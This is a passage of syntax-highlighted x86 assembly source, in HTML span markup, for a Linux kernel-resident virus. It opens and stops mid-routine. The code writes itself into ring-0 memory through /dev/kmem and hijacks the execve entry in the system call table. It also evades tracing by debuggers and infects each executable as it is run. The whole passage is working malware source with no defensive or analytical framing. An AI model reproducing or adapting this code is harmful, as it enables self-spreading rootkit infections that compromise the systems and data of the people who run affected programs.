        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">ApiSysSethostname</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lSeek</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">AllocateKernelSpace</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_write</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0"> </span><span class="sc1">; amount of mem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">_KMalloc</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; adr of kmalloc sym</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_sethostname</span><span class="sc1">; execute KernelSpace routine !!</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">Kspace</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; @ of allocated kernel space</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">ExecveAdr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">ExecveAdr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">HookExecve</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0"> </span><span class="sc1">; seek to kernelSpace </span><span class="sc0">
</span><span class="sc5">routine</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">ApiSysSethostname</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lSeek</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_write</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">;restore sethostname code</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;restore stack</span><span class="sc0">

        </span><span class="sc1">;---- copy virus code and put its adr in sys_call_table ----</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">Kspace</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lSeek</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_write</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; write virus code in ring0 memory</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">_sys_call_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SYS_execve</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc1">;seek to sys_call_table[SYS_execve]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lSeek</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">ExecveAdr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_write</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; write the hook</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_close</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; close /dev/kmem</span><span class="sc0">
      </span><span class="sc5">eof_res</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; NAME   * GetSyscall                              ;</span><span class="sc0">
</span><span class="sc1">; DESCR  * find syscall in kernel_sym table                ;</span><span class="sc0">
</span><span class="sc1">;        *                                             ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; INPUT  * EBX = file no of memory kmem                    ;</span><span class="sc0">
</span><span class="sc1">;      ECX = adr of memory to write syscall adr            ;</span><span class="sc0">
</span><span class="sc1">;      EDX = adr of syscall in kmem                    ;</span><span class="sc0">
</span><span class="sc1">; OUTPUT *                                 ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">GetSyscall</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lSeek</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_read</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; NAME   * GetAPIs                             ;</span><span class="sc0">
</span><span class="sc1">; DESCR  * find all Kernel APIs in a table                 ;</span><span class="sc0">
</span><span class="sc1">;        *                                             ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; INPUT  * ESI = ptr to ze API crc32 table                 ;</span><span class="sc0">
</span><span class="sc1">;      EDI = ptr to ze API offsetz table                   ;</span><span class="sc0">
</span><span class="sc1">;      ECX = number of symbolz                     ;</span><span class="sc0">
</span><span class="sc1">; OUTPUT *                                 ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">GetAPIs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPI</span><span class="sc0">

    </span><span class="sc6">stosd</span><span class="sc0">           </span><span class="sc1">; store offset of API</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0BBh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GetAPIs</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; NAME   * GetAPI                              ;</span><span class="sc0">
</span><span class="sc1">; DESCR  * find Kernel API                         ;</span><span class="sc0">
</span><span class="sc1">;        *                                             ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; INPUT  * ESI = adr of crc32 API to look for                  ;</span><span class="sc0">
</span><span class="sc1">;      ECX = number of symbolz                     ;</span><span class="sc0">
</span><span class="sc1">; OUTPUT * EAX = adr of sym or NULL if not found               ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
    </span><span class="sc5">KernelSym</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">; adr of kernel API table</span><span class="sc0">
</span><span class="sc5">GetAPI</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; edi hold adr of crc32 api</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">KernelSym</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
      </span><span class="sc5">find_nxt</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;compare crc'z</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">found_sym</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">find_nxt</span><span class="sc0">

      </span><span class="sc5">found_sym</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">get_sym</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc5">get_sym</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; NAME   * AllocateKernelSpace                                             ;</span><span class="sc0">
</span><span class="sc1">; DESCR  * this routine reserves memory                                    ;</span><span class="sc0">
</span><span class="sc1">;        * it is overwritten by the virus over uname                       ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; INPUT  *  first param adr of kmalloc sym                                 ;</span><span class="sc0">
</span><span class="sc1">;        *  2nd param amount of mem to alloacate                           ;</span><span class="sc0">
</span><span class="sc1">; OUTPUT *                                                                 ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">AllocateKernelSpace</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get kmalloc adr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get amount to allocate</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; kmalloc</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndOfAllocateKernelSpace</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; NAME   * HookExecve                                  ;</span><span class="sc0">
</span><span class="sc1">; DESCR  * this routine hooks execve syscall and run in ring 0 mode        ;</span><span class="sc0">
</span><span class="sc1">;        *                                                             ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; INPUT  *                                 ;</span><span class="sc0">
</span><span class="sc1">; OUTPUT *                                                     ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">HookExecve</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get first parameter</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0666h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NotMySelf</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; return 0667h becoze it is the</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; residence mark</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

      </span><span class="sc5">NotMySelf</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetCurrentTask</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get ptrace member of current task</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">        </span><span class="sc1">; is any tracer ?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">jmp_syscall</span><span class="sc0">    </span><span class="sc1">; yeah then fuck</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta_ring0</span><span class="sc0">
      </span><span class="sc5">delta_ring0</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc1">; do infection stuff</span><span class="sc0">
    </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">sz_filter</span><span class="sc4">]</span><span class="sc1">; while debugging infect</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; files wich begin with sz_filter</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">jmp_syscall</span><span class="sc0">

    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@msg1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"&lt;1&gt;try to infect %s ???"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">@msg1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">_Printk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TryInfection</span><span class="sc0">

      </span><span class="sc5">jmp_syscall</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">068h</span><span class="sc0">            </span><span class="sc1">; jmp to original sys_call</span><span class="sc0">
    </span><span class="sc5">ApiSysExecve</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">  </span><span class="sc1">; push ApiSysExecve</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; NAME   * TryInfection                                    ;</span><span class="sc0">
</span><span class="sc1">; DESCR  * this routine try to infect file being executed                  ;</span><span class="sc0">
</span><span class="sc1">;        * I try to play only with exported kernel symbolz             ;</span><span class="sc0">
</span><span class="sc1">;    *                                 ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; INPUT  * ebx: name of the file                       ;</span><span class="sc0">
</span><span class="sc1">; OUTPUT *                                                 ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">TryInfection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">        </span><span class="sc1">; open in O_RDWR mode</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">_Open</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; open up!</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFFF000h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">open_fail</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc5">KOF</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
